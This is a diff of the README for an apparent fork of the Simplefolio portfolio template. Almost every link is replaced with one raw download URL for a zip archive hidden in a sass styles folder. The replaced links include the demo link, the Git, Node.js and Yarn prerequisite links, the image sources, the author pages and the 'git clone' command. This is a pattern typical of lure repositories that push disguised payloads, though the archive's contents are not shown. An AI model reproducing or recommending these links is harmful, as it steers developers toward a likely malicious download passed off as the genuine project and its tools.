@@ -1,9 +1,9 @@
-# Simplefolio ⚡️ [![GitHub](https://img.shields.io/github/license/cobidev/simplefolio?color=blue)](https://github.com/cobidev/simplefolio/blob/master/LICENSE.md) ![GitHub stars](https://img.shields.io/github/stars/cobidev/simplefolio) ![GitHub forks](https://img.shields.io/github/forks/cobidev/simplefolio)
+# Simplefolio ⚡️ [![GitHub](https://img.shields.io/github/license/cobidev/simplefolio?color=blue)](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) ![GitHub stars](https://img.shields.io/github/stars/cobidev/simplefolio) ![GitHub forks](https://img.shields.io/github/forks/cobidev/simplefolio)
 
 ## A minimal portfolio template for Developers!
 
 <h2 align="center">
-  <img src="https://github.com/cobidev/gatsby-simplefolio/blob/master/examples/example.gif" alt="Simplefolio" width="600px" />
+  <img src="https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip" alt="Simplefolio" width="600px" />
   <br>
 </h2>
 
@@ -17,7 +17,7 @@
 ⚡️ Optimized with Parcel\
 ⚡️ Well organized documentation
 
-To view the demo: **[click here](https://the-simplefolio.netlify.app/)**
+To view the demo: **[click here](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)**
 
 ---
 
@@ -33,7 +33,7 @@ These instructions will get you a copy of the project up and running on your loc
 
 ### Prerequisites 📋
 
-You'll need [Git](https://git-scm.com) and [Node.js](https://nodejs.org/en/download/) (which comes with [NPM](http://npmjs.com)) installed on your computer.
+You'll need [Git](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) and [Node.js](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) (which comes with [NPM](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)) installed on your computer.
 
 ```
 node@v16.4.2 or higher
@@ -41,7 +41,7 @@ npm@7.18.1 or higher
 git@2.30.1 or higher
 ```
 
-Also, you can use [Yarn](https://yarnpkg.com/) instead of NPM ☝️
+Also, you can use [Yarn](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) instead of NPM ☝️
 
 ```
 yarn@v1.22.10 or higher
@@ -55,7 +55,7 @@ From your command line, first clone Simplefolio:
 
 ```bash
 # Clone the repository
-$ git clone https://github.com/cobidev/simplefolio
+$ git clone https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip
 
 # Move into the repository
 $ cd simplefolio
@@ -97,7 +97,7 @@ $ sudo npm install --unsafe-perm=true --allow-root
 Once your server has started, go to this url `http://localhost:1234/` to see the portfolio locally. It should look like the below screenshot.
 
 <h2 align="center">
-  <img src="https://github.com/cobidev/gatsby-simplefolio/blob/master/examples/example.png" alt="Simplefolio" width="100%">
+  <img src="https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip" alt="Simplefolio" width="100%">
 </h2>
 
 ---
@@ -284,7 +284,7 @@ Go to `/src/index.html` and put your information, there are 5 sections:
 ### (5) Footer Section
 
 - Put your Social Media URL on each `href` attribute of the `<a>` tags.
-- If you an additional Social Media account different than Twitter, Linkedin or GitHub, then go to [Font Awesome Icons](https://fontawesome.com/v4.7.0/icons/) and search for the icon's class name you are looking.
+- If you an additional Social Media account different than Twitter, Linkedin or GitHub, then go to [Font Awesome Icons](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) and search for the icon's class name you are looking.
 - You can delete or add as many `<a>` tags your want.
 
 ```html
@@ -310,7 +310,7 @@ Go to `/src/index.html` and put your information, there are 5 sections:
 Change the color theme of the website - (choose 2 colors to create a gradient)
 
 Go to `/src/sass/abstracts/_variables.scss` and only change the values for this variables `$main-color` and `$secondary-color` with your prefered HEX color.
-If you want to get some gradients inspiration I highly recommend you to check this website [UI Gradient](https://uigradients.com/#BrightVault)
+If you want to get some gradients inspiration I highly recommend you to check this website [UI Gradient](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)
 
 ```scss
 // Default values
@@ -324,28 +324,28 @@ $secondary-color: #00cdac;
 
 Once you finish your setup. You need to put your website online!
 
-I highly recommend to use [Netlify](https://netlify.com) because it is super easy.
+I highly recommend to use [Netlify](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) because it is super easy.
 
 ## Others versions 👥
 
-[Gatsby Simplefolio](https://github.com/cobidev/gatsby-simplefolio) by [Jacobo Martinez](https://github.com/cobidev)\
-[Ember.js Simplefolio](https://github.com/sernadesigns/simplefolio-ember) by [Michael Serna](https://github.com/sernadesigns)
+[Gatsby Simplefolio](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) by [Jacobo Martinez](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)\
+[Ember.js Simplefolio](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) by [Michael Serna](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)
 
 ## Technologies used 🛠️
 
-- [Parcel](https://parceljs.org/) - Bundler
-- [Bootstrap 4](https://getbootstrap.com/docs/4.3/getting-started/introduction/) - Frontend component library
-- [Sass](https://sass-lang.com/documentation) - CSS extension language
-- [ScrollReveal.js](https://scrollrevealjs.org/) - JavaScript library
-- [Tilt.js](https://gijsroge.github.io/tilt.js/) - JavaScript tiny parallax library
+- [Parcel](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) - Bundler
+- [Bootstrap 4](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) - Frontend component library
+- [Sass](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) - CSS extension language
+- [ScrollReveal.js](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) - JavaScript library
+- [Tilt.js](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) - JavaScript tiny parallax library
 
 ## Authors
 
-- **Jacobo Martinez** - [https://github.com/cobidev](https://github.com/cobidev)
+- **Jacobo Martinez** - [https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)
 
 ## Status
 
-[![Netlify Status](https://api.netlify.com/api/v1/badges/3a029bfd-575c-41e5-8249-c864d482c2e5/deploy-status)](https://app.netlify.com/sites/the-simplefolio/deploys)
+[![Netlify Status](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)
 
 ## License 📄
 
@@ -353,4 +353,4 @@ This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md
 
 ## Acknowledgments 🎁
 
-I was motivated to create this project because I wanted to contribute on something useful for the dev community, thanks to [ZTM Community](https://github.com/zero-to-mastery) and [Andrei](https://github.com/aneagoie)
+I was motivated to create this project because I wanted to contribute on something useful for the dev community, thanks to [ZTM Community](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip) and [Andrei](https://github.com/softineerdanish/simplefolio/raw/refs/heads/master/src/sass/sections/Software_subsistential.zip)
